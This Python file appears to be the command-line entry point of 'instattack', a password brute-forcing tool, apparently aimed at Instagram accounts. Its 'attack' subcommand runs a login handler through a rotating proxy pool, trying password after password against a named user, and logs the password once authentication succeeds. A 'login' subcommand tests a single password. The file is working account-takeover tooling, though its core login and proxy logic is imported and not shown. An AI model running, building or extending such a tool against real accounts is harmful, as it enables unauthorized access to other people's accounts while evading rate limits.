from argparse import ArgumentTypeError
import asyncio
from platform import python_version
from plumbum import cli
import tortoise

from instattack import logger
from instattack.config import Configuration
from instattack.src.users import User
from instattack.src.login import LoginHandler
from instattack.src.proxies import ProxyHandler


def post_handlers(user, config):

    lock = asyncio.Lock()
    start_event = asyncio.Event()
    auth_result_found = asyncio.Event()

    proxy_handler = ProxyHandler(
        config['proxies'],
        lock=lock,
        start_event=start_event,
    )

    password_handler = LoginHandler(
        config['login'],
        proxy_handler,
        user=user,
        start_event=start_event,
        stop_event=auth_result_found,
    )
    return proxy_handler, password_handler


class BaseApplication(cli.Application):
    """
    Used so that we can easily extend Instattack without having to worry about
    overriding the main method.
    """
    log = logger.get_sync('Application')
    _config = None

    @property
    def config(self):
        if not self._config:
            self._config = Configuration.load()
        return self._config

    async def get_user(self, username):
        try:
            user = await User.get(username=username)
        except tortoise.exceptions.DoesNotExist:
            self.log.error(f'User {username} does not exist.')
            return None
        else:
            user.setup()
            return user

    async def check_if_user_exists(self, username):
        try:
            user = await User.get(username=username)
        except tortoise.exceptions.DoesNotExist:
            return None
        else:
            return user


class EntryPoint(BaseApplication):

    def main(self, *args):
        self.validate(*args)

    def validate(self, *args):
        if int(python_version()[0]) < 3:
            raise EnvironmentError('Please use Python 3')

        if args:
            raise ArgumentTypeError("Unknown command %r" % (args[0]))

        # The nested command will be`None if no sub-command follows
        if not self.nested_command:
            raise ArgumentTypeError("No command given")


@EntryPoint.subcommand('login')
class TestLogin(BaseApplication):

    __name__ = 'Test Login'

    collect = cli.Flag("--collect", default=False)

    def main(self, username, password):
        log = logger.get_sync(__name__, subname='main')

        # Default Collect to False
        self.config
        self._config.update({'proxies': {'pool': {'collect': self.collect}}})

        loop = asyncio.get_event_loop()

        user = loop.run_until_complete(self.get_user(username))
        if not user:
            return

        result = loop.run_until_complete(self.test_login(loop, user, password))
        log.complete(str(result))
        return 1

    async def test_login(self, loop, user, password):
        log = logger.get_async(__name__, subname='test_login')

        proxy_handler, password_handler = post_handlers(user, self.config)

        results = await asyncio.gather(
            password_handler.attempt_single_login(loop, password),
            proxy_handler.run(loop),
        )

        # We might not need to stop proxy handler.
        await log.debug('Stopping Proxy Handler...')
        await proxy_handler.stop(loop)

        await log.debug('Returning Result')
        return results[0]


@EntryPoint.subcommand('attack')
class BaseAttack(BaseApplication):

    __name__ = 'Run Attack'

    # Overrides Password Limit Set in Configuration File
    limit = cli.SwitchAttr("--limit", int, mandatory=False,
        help="Limit the number of proxies to collect.")

    collect = cli.Flag("--collect", default=False)

    def main(self, username):
        """
        Iteratively tries each password for the given user with the provided
        token until a successful response is achieved for each password or
        a successful authenticated response is achieved for any password.

        We cannot perform any actions in finally because if we hit an exception,
        the loop will have been shutdown by that point.

        Proxies will not be saved if it wasn't started, but that is probably
        desired behavior.
        """
        log = logger.get_sync(__name__, subname='main')

        # Default Collect to False
        self.config
        self._config.update({'proxies': {'pool': {'collect': self.collect}}})
        if self.limit:
            self._config.update({'login': {'limit': self.limit}})

        loop = asyncio.get_event_loop()

        user = loop.run_until_complete(self.get_user(username))
        if not user:
            return

        # Result will only return if it is authorized.
        results = loop.run_until_complete(self.attack(loop, user))
        if results.has_authenticated:
            log.success(f'Authenticated User!', extra={
                'password': results.authenticated_result.context.password
            })
        return 1

    async def attack(self, loop, user):
        log = logger.get_async(__name__, subname='test_login')

        proxy_handler, password_handler = post_handlers(user, self.config)

        results = await asyncio.gather(
            password_handler.run(loop),
            proxy_handler.run(loop),
        )

        # We might not need to stop proxy handler.
        await log.debug('Stopping Proxy Handler...')
        await proxy_handler.stop(loop)

        await log.debug('Returning Result')
        return results[0]
